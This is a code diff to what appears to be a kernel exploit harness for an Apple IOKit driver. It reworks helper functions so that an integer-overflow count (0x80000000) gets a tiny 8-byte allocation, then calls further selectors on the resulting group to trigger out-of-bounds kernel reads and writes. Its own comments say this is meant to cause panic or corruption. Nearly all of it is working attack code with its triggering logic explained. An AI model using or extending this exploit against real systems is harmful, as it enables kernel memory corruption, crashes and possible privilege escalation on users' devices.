@@ -259,7 +259,8 @@ extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
 #define SGAR_STRUCT_SIZE     0x410   /* confirmed live: device->0x278 == 0x410 */
 #define SGAR_COUNT_OFFSET    0x20
 
-static void try_sgar(io_connect_t conn, uint32_t count, const char *label) {
+/* try_sgar: call sel=6 with given count; return group_id (out[0]) or 0 on failure */
+static uint64_t try_sgar(io_connect_t conn, uint32_t count, const char *label) {
     static uint8_t add_in[SGAR_STRUCT_SIZE];
     uint8_t add_out[0x10];
     size_t  add_out_sz = sizeof(add_out);
@@ -274,9 +275,43 @@ static void try_sgar(io_connect_t conn, uint32_t count, const char *label) {
         NULL, &out_cnt, add_out, &add_out_sz);
 
     evf("[BOF] %s count=0x%x kr=0x%x", label, count, kr);
-    if (kr == 0)
-        evf("[BOF] %s SUCCESS out[0]=0x%llx", label,
-            *(uint64_t *)add_out);
+    if (kr == 0) {
+        uint64_t gid = *(uint64_t *)add_out;
+        evf("[BOF] %s SUCCESS group_id=0x%llx", label, gid);
+        return gid;
+    }
+    return 0;
+}
+
+/* try_sel7: call sel=7 with group_id scalar — triggers group lifecycle operation */
+static kern_return_t try_sel7(io_connect_t conn, uint32_t group_id, const char *label) {
+    uint64_t sc_in[1] = { group_id };
+    kern_return_t kr = IOConnectCallMethod(conn, 7,
+        sc_in, 1, NULL, 0,
+        NULL, NULL, NULL, NULL);
+    evf("[BOF] %s sel=7 group_id=0x%x kr=0x%x", label, group_id, kr);
+    return kr;
+}
+
+/* try_sel8: call sel=8 with group_id in struct — variable in/out operation */
+static kern_return_t try_sel8(io_connect_t conn, uint32_t group_id, const char *label) {
+    uint8_t s8_in[SGAR_STRUCT_SIZE];
+    uint8_t s8_out[SGAR_STRUCT_SIZE];
+    size_t  s8_out_sz = sizeof(s8_out);
+    uint32_t out_cnt = 0;
+
+    memset(s8_in,  0, sizeof(s8_in));
+    memset(s8_out, 0, sizeof(s8_out));
+    /* Group ID likely at [0x00] of struct for sel=8 */
+    *(uint32_t *)(s8_in + 0x00) = group_id;
+    /* Also try at [0x20] in case sel=8 uses same count field */
+    *(uint32_t *)(s8_in + 0x20) = 2;  /* try adding 2 resources */
+
+    kern_return_t kr = IOConnectCallMethod(conn, 8,
+        NULL, 0, s8_in, sizeof(s8_in),
+        NULL, &out_cnt, s8_out, &s8_out_sz);
+    evf("[BOF] %s sel=8 group_id=0x%x kr=0x%x", label, group_id, kr);
+    return kr;
 }
 
 static void trigger_bof_iokit(void) {
@@ -310,35 +345,33 @@ static void trigger_bof_iokit(void) {
         return;
     }
 
-    /* Baseline: count=4 → expect kIOReturnSuccess (0x0) on patched or unpatched */
-    try_sgar(conn, 4,           "BASELINE_4");
-    try_sgar(conn, 16,          "BASELINE_16");
+    /* Baseline groups */
+    uint64_t base_gid = try_sgar(conn, 4, "BASELINE_4");
 
-    /* Overflow: count=INT32_MIN → smull(-2147483648, 24)+8 = -8 → tiny alloc + BOF */
-    try_sgar(conn, 0x80000000u, "OVERFLOW_INT32MIN");
+    /* Create OVERFLOW group: count=0x80000000 → 32-bit mul truncation → 8-byte alloc
+     * alloc_size = (0x80000000 * 24) mod 2^32 + 8 = 0 + 8 = 8 bytes
+     * group is registered with count=0x80000000 in its metadata */
+    uint64_t ovf_gid = try_sgar(conn, 0x80000000u, "OVERFLOW_INT32MIN");
 
-    /* If INT32_MIN doesn't trigger, try variant: count=0x20000000 */
-    /* smull(0x20000000, 24)+8 = 0x300000008 → truncated to 8 bytes → BOF */
-    try_sgar(conn, 0x20000000u, "OVERFLOW_0x20000000");
-
-    /* Diagnostic: probe adjacent sizes to find what device->0x278 is */
-    /* If all above return 0xe00002c2 (bad arg), the struct size check is failing */
-    static const uint32_t probe_sizes[] = {
-        0x40, 0x80, 0x100, 0x200, 0x300, 0x400, 0x408, 0x410, 0x500, 0x600, 0
-    };
-    for (int i = 0; probe_sizes[i]; i++) {
-        uint8_t tmp_in[0x800] = {0};
-        uint8_t tmp_out[0x10] = {0};
-        size_t  tmp_out_sz = sizeof(tmp_out);
-        uint32_t out_cnt = 0;
-        *(uint32_t *)(tmp_in + SGAR_COUNT_OFFSET) = 4;
-        kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
-            NULL, 0, tmp_in, probe_sizes[i],
-            NULL, &out_cnt, tmp_out, &tmp_out_sz);
-        /* Only report non-unsupported (filter noise) */
-        if (kr != 0xe00002c7)
-            evf("[BOF] SIZE_PROBE sz=0x%x kr=0x%x", probe_sizes[i], kr);
+    /* Phase 2: trigger deferred OOB via sel=7 (lifecycle operation on overflow group)
+     * sel=7 takes scalarInput[0]=group_id and operates on group backing array.
+     * With count=0x80000000 elements stored but only 8 bytes allocated,
+     * any element-wise iteration → OOB read/write → panic or corruption. */
+    if (ovf_gid) {
+        evf("[BOF] DEFERRED_TRIGGER: sel=7 on overflow group_id=0x%llx", ovf_gid);
+        kern_return_t kr7 = try_sel7(conn, (uint32_t)ovf_gid, "SEL7_OVERFLOW");
+        evf("[BOF] SEL7 result=0x%x (0=corrupted/panic, else handled)", kr7);
     }
+
+    /* Phase 3: probe sel=8 (update group) on overflow group */
+    if (ovf_gid) {
+        try_sel8(conn, (uint32_t)ovf_gid, "SEL8_OVERFLOW");
+    }
+
+    /* Variant overflow count */
+    uint64_t ovf2_gid = try_sgar(conn, 0x20000000u, "OVERFLOW_0x20000000");
+    if (ovf2_gid)
+        try_sel7(conn, (uint32_t)ovf2_gid, "SEL7_OVF2");
 
     IOServiceClose(conn);
     evf("[BOF] IOKIT_DONE");
